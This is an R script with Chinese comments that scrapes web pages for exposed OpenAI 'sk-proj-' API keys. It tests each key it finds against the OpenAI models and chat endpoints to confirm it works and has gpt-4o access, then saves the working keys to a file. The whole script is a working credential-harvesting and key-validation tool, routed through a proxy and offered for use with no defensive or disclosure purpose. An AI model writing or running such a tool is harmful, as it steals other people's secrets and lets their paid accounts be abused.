# 安装必要的包（如果尚未安装）
if (!require(httr)) install.packages("httr", dependencies = TRUE)
if (!require(stringr)) install.packages("stringr", dependencies = TRUE)
if (!require(jsonlite)) install.packages("jsonlite", dependencies = TRUE)

# 加载包
library(httr)
library(stringr)
library(jsonlite)

# 配置代理设置
proxy <- use_proxy(url = "127.0.0.1", port = 7890)

# 如果您的代理需要认证，请取消注释并填写用户名和密码
# proxy <- use_proxy(url = "127.0.0.1", port = 7890, username = "your_username", password = "your_password")

# 目标 IP 列表
 target_urls <- paste0(unique(read.table("base_url.txt",sep = "\t")$V1))  # 替换为实际的 URL
#target_urls <- paste0("https://namesgenerator.ai/")  # 替换为实际的 URL

# 定义用于验证 OpenAI 密钥的函数
validate_key <- function(key, proxy) {
  # 设置 API 端点，用于列出模型
  api_url_models <- "https://api.openai.com/v1/models"
  
  # 设置请求头，包含授权信息
  headers <- add_headers(
    "Authorization" = paste("Bearer", key),
    "Content-Type" = "application/json"
  )
  
  # 发送 GET 请求以列出模型
  response_models <- try(GET(api_url_models, headers, proxy, timeout(10)), silent = TRUE)
  
  # 检查请求是否成功
  if (inherits(response_models, "try-error")) {
    return(list(is_valid = FALSE, has_gpt4 = FALSE))
  }
  
  status_models <- status_code(response_models)
  
  if (status_models != 200) {
    return(list(is_valid = FALSE, has_gpt4 = FALSE))
  }
  
  # 解析模型列表
  models_content <- content(response_models, "text", encoding = "UTF-8")
  models_json <- fromJSON(models_content)
  
  # 检查是否包含 gpt-4o 模型
  gpt4_models <- grep("^gpt-4o", models_json$data$id, value = TRUE)
  
  if (length(gpt4_models) == 0) {
    return(list(is_valid = TRUE, has_gpt4 = FALSE))
  }
  
  # 尝试使用 gpt-4o 模型发送测试请求
  api_url_chat <- "https://api.openai.com/v1/chat/completions"
  
  # 构建测试请求体
  body <- list(
    model = "gpt-4o",
    messages = list(
      list(role = "system", content = "你是一个测试机器人。"),
      list(role = "user", content = "测试 gpt-4o 能力。")
    ),
    max_tokens = 10
  )
  
  response_chat <- try(POST(
    api_url_chat,
    headers,
    proxy,
    body = toJSON(body, auto_unbox = TRUE),
    encode = "json",
    timeout(10)
  ), silent = TRUE)
  
  # 检查聊天请求是否成功
  if (inherits(response_chat, "try-error")) {
    return(list(is_valid = TRUE, has_gpt4 = FALSE))
  }
  
  status_chat <- status_code(response_chat)
  
  if (status_chat == 200) {
    return(list(is_valid = TRUE, has_gpt4 = TRUE))
  } else {
    # 可以进一步解析错误信息以确定具体原因
    error_content <- content(response_chat, "text", encoding = "UTF-8")
    error_json <- fromJSON(error_content, simplifyVector = TRUE)
    
    # 判断是否因为权限不足或模型不可用
    if (!is.null(error_json$error) && grepl("invalid_request_error", error_json$error$type, ignore.case = TRUE)) {
      return(list(is_valid = TRUE, has_gpt4 = FALSE))
    }
    
    return(list(is_valid = TRUE, has_gpt4 = FALSE))
  }
}


# 存储有效且支持 gpt-4o 的密钥
valid_gpt4_keys <- c()

# 检查请求状态并提取内容
for (i in target_urls) {
  # 发送 GET 请求，同时使用代理
  response <- try(GET(i, proxy, timeout(10)), silent = TRUE)
  
  if (inherits(response, "try-error")) {
    cat("无法访问 URL:", i, "请求失败。\n")
    next
  }
  
  if (status_code(response) == 200) {
    content_text <- content(response, "text", encoding = "UTF-8")
    
    # 提取包含 "sk-" 的密钥（根据实际密钥格式调整正则）
    keys <- str_extract_all(content_text, "sk-proj-[A-Za-z0-9-_]+")[[1]]
    keys <- unique(keys)
    cat("在", i, "找到", length(keys), "个密钥。\n")
    print(keys)
    
    # 验证每个密钥
    for (key in keys) {
      cat("验证密钥：", key, "...\n")
      validation_result <- validate_key(key, proxy)
      
      if (validation_result$is_valid) {
        if (validation_result$has_gpt4) {
          cat("密钥有效，并支持 gpt-4o。\n")
          valid_gpt4_keys <- c(valid_gpt4_keys, key)
        } else {
          cat("密钥有效，但不支持 gpt-4o。\n")
        }
      } else {
        cat("密钥无效或请求失败，跳过。\n")
      }
      
      # 可选：为避免触发速率限制，添加短暂的延迟
      Sys.sleep(1)
    }
    
  } else {
    cat("无法访问 URL:", i, "状态码:", status_code(response), "\n")
  }
}
valid_gpt4_keys<-unique(valid_gpt4_keys)
# 输出所有有效且支持 gpt-4o 的密钥
if (length(valid_gpt4_keys) > 0) {
  cat("找到", length(valid_gpt4_keys), "个有效且支持 gpt-4o 的密钥：\n")
  print(valid_gpt4_keys)
  
  # 可选：将有效密钥保存到文件
  writeLines(valid_gpt4_keys, "valid_gpt4_keys.txt")
  cat("有效密钥已保存到 'valid_gpt4_keys.txt'\n")
} else {
  cat("未找到有效且支持 gpt-4o 的密钥。\n")
}

